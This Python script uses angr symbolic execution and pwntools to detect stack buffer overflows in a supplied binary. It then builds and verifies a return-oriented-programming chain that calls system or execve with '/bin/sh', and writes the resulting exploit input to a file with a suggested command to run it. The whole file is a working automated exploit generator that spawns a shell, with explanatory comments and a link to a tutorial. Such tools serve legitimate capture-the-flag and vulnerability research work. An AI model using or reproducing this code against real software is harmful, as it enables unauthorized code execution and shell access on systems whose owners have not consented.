#!/usr/bin/env python
import angr
import argparse
import claripy
import logging
import os

logging.basicConfig()
log = logging.getLogger(__name__)
from pwn import *

input_buffer_file = "./pwn_input"

"""
Generate a rop chain that calls
execve("/bin/sh",NULL,NULL) for the
given binary
"""
def generate_standard_rop_chain(binary_path):
    context.binary = binary_path
    elf = ELF(binary_path)
    rop = ROP(elf)

    # These are strings we want to call
    strings = [b"/bin/sh\x00", b"/bin/bash\x00"]
    functions = ["system", "execve"]

    """
    The two main components we need in our rop chain
    is either a system() or exec() call and a refernce
    to the string we want to call (/bin/sh)
    """
    ret_func = None
    ret_string = None

    """
    angr can find these functions using the loader reference
    p.loader, however we'll need to use pwntools for the rop
    chain generation anyways, so we'll just stick with pwntools
    """
    for function in functions:
        if function in elf.plt:
            ret_func = elf.plt[function]
            break
        elif function in elf.symbols:
            ret_func = elf.symbols[function]
            break

    # Find the string we want to pass it
    for string in strings:
        str_occurences = list(elf.search(string))
        if str_occurences:
            ret_string = str_occurences[0]
            break

    if not ret_func:
        raise RuntimeError("Cannot find symbol to return to")
    if not ret_string:
        raise RuntimeError("Cannot find string to pass to system or exec call")

    # movabs fix
    """
    During amd64 ropchaining, there is sometimes a stack alignment
    issue that folks call the `movabs` issue inside of a system()
    call.Adding a single rop-ret gadget here fixes that.
    """
    rop.raw(rop.ret.address)

    """
    The pwntools interface is nice enough to enable us to construct
    our chain with a rop.call function here.
    """
    rop.call(ret_func, [ret_string])

    log.info("rop chain gadgets and values:\n{}".format(rop.dump()))

    """
    We need both the generated chain and gadget addresses for when
    we contrain theprogram state to execute and constrain this chain,
    so we pass back both the rop tools refernce along with the chain.
    """
    return rop, rop.build()


"""
There are two main ways we can generate and verify a rop chain, if 
we assume that our gadgets might not be right next to each other
on the stack, then we want to emulate and step through each piece of
our ropchain and contrain each address or register to the expected 
value
"""
def do_64bit_rop_with_stepping(elf, rop, rop_chain, new_state):
    user_input = new_state.globals["user_input"]
    curr_rop = None
    elf_symbol_addrs = [y for x, y in elf.symbols.items()]

    """
    We are going to iterate over gadgets or values set in the
    chain to apply constraints to either the program counter
    or pushed/poped register
    """
    for i, gadget in enumerate(rop_chain):

        """
        We generally have two constraining mode:
        1. running a code gadget
        2. setting a register
        """
        if gadget in rop.gadgets:
            curr_rop = rop.gadgets[gadget]

            # reversing it lets us pop values out easy
            curr_rop.regs.reverse()

        """
        Case 1. Running a code gadget.
        We keep track of the number of registers our gadget
        popped, and if it's 0, then we're just executing.
        """
        if curr_rop is None or gadget in rop.gadgets or len(curr_rop.regs) == 0:

            if new_state.satisfiable(extra_constraints=([new_state.regs.pc == gadget])):
                """
                For the actual ROP gadgets, we're stepping through them
                until we hit an unconstrained value - We did a `ret` back
                onto the symbolic stack.
                This process is slower than just setting the whole stack
                to the chain, but in testing it seems to work more reliably
                """
                log.info("Setting PC to {}".format(hex(gadget)))
                new_state.add_constraints(new_state.regs.pc == gadget)

                """
                Since we're emulating the program's execution with angr we
                will run into an issue when executing any symbols. Where a
                SimProcedure will get executed instead of the real function,
                which then gives us the wrong constraints/execution for our
                rop_chain
                """
                if gadget in elf_symbol_addrs:
                    log.info(
                        "gadget is hooked symbol, contraining to real address, but calling SimProc"
                    )
                    symbol = [x for x in elf.symbols.items() if gadget == x[1]][0]
                    p = new_state.project
                    new_state.regs.pc = p.loader.find_symbol(symbol[0]).rebased_addr

                """
                There is no point in letting our last gadget run, we have all
                the constraints on our input to trigger the leak
                """
                if i == len(rop_chain) - 1:
                    break

                """
                Since we're stepping through a ROP chain, VEX IR wants to
                try and lift the whole block and emulate a whole block step
                this will break what we're trying to do, so we need to
                tell it to try and emulate single-step execution as closely
                as we can with the opt_level=0    
                """
                rop_simgr = new_state.project.factory.simgr(new_state)
                rop_simgr.explore(opt_level=0)
                new_state = rop_simgr.unconstrained[0]

            else:
                log.error("unsatisfied on {}".format(hex(gadget)))
                break

        else:
            """
            Case 2: We're setting a register to an expected popped value

            Usually for 64bit rop chains, we're passing values into
            the argument registers like RDI, so this only covers RDI
            since the auto-rop chain is pretty simple, but we would
            extend this portion to cover all register sets from POP
            calls
            """
            next_reg = curr_rop.regs.pop()
            log.debug("Setting register : {}".format(next_reg))

            gadget_msg = gadget
            if isinstance(gadget, int):
                gadget_msg = hex(gadget)

            state_reg = getattr(new_state.regs, next_reg)
            if state_reg.symbolic and new_state.satisfiable(
                extra_constraints=([state_reg == gadget])
            ):

                log.info("Setting {} to {}".format(next_reg, gadget_msg))

                new_state.add_constraints(state_reg == gadget)
            else:
                log.error("unsatisfied on {} -> {}".format(next_reg, gadget_msg))
                break

            if len(curr_rop.regs) == 0:
                curr_rop = None
    return user_input, new_state


def get_rop_chain(state):

    """
    We're using a copy of the original state since we are applying
    constraints one at a time and stepping through the state.
    """
    state_copy = state.copy()

    binary_name = state.project.filename

    pwntools_elf = ELF(binary_name)

    """
    Here we're getting the ropchain bytes and rop chain object
    that has the individual gadget addresses and values
    """
    rop_object, rop_chain = generate_standard_rop_chain(binary_name)

    """
    Here we're running through the program state and setting
    each gadget.
    """
    user_input, new_state = do_64bit_rop_with_stepping(
        pwntools_elf, rop_object, rop_chain, state_copy
    )

    """
    With our constraints set, our binary's STDIN
    should now contain our entire overflow + ropchain!
    """
    input_bytes = new_state.posix.dumps(0)

    return input_bytes


# https://breaking-bits.gitbook.io/breaking-bits/vulnerability-discovery/automated-exploit-development/buffer-overflows
def check_mem_corruption(simgr):

    # Check for unconstrainted state where we control the
    # program counterelf
    for state in simgr.unconstrained:
        if state.satisfiable(extra_constraints=[state.regs.pc == b"CCCCCCCC"]):

            # Here we know we can arbitrarily set the program counter,
            # so now we want to set it to a ropchain we generate for the
            # program
            pc_overwrite = state.posix.dumps(
                0, extra_constraints=[state.regs.pc == b"CCCCCCCC"]
            )
            log.info("We can overwrite the PC with : {}".format(pc_overwrite))
            log.info(
                "PC overwrite starts at : {}".format(pc_overwrite.index(b"CCCCCCCC"))
            )

            rop_chain_bytes = get_rop_chain(state)
            log.info("We can run our ropchain with : {}".format(rop_chain_bytes))

            if state.satisfiable():
                state.globals["rop_chain_bytes"] = rop_chain_bytes
                simgr.stashes["mem_corrupt"].append(state)

            simgr.stashes["unconstrained"].remove(state)
            simgr.drop(stash="active")
    return simgr


def main():
    parser = argparse.ArgumentParser()

    parser.add_argument("Binary")

    args = parser.parse_args()

    input_arg = claripy.BVS("input", 400 * 8)

    p = angr.Project(args.Binary)
    state = p.factory.full_init_state(
        stdin=input_arg,
        env=os.environ,
    )

    state.libc.buf_symbolic_bytes = 0x100
    state.globals["user_input"] = input_arg

    simgr = p.factory.simgr(state, save_unconstrained=True)
    simgr.stashes["mem_corrupt"] = []

    simgr.explore(step_func=check_mem_corruption)

    """
    Write rop chain out to a file
    """
    if "mem_corrupt" in simgr.stashes:
        rop_chain_bytes = simgr.stashes["mem_corrupt"][0].globals["rop_chain_bytes"]
        with open(input_buffer_file, "wb") as f:
            f.write(rop_chain_bytes)
        log.info("Wrote rop chain to file : {}".format(input_buffer_file))

    log.info("Try running : cat {} - | ./{}".format(input_buffer_file, args.Binary))


if __name__ == "__main__":
    main()
